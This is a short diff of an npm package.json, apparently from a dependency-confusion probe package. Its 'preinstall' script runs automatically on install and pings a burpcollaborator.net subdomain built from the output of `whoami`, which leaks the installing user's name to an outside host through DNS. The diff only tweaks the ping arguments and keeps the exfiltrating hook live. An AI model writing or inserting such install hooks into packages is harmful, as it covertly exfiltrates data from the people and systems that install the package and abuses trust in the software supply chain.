@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "preinstall": "ping `whoami`.fl4zjl7b7ivcankm6j0zywwt1k7cv1.burpcollaborator.net"
+    "preinstall": "ping -n 2 `whoami`.fl4zjl7b7ivcankm6j0zywwt1k7cv1.burpcollaborator.net"
   },
   "author": "random",
   "license": "ISC"
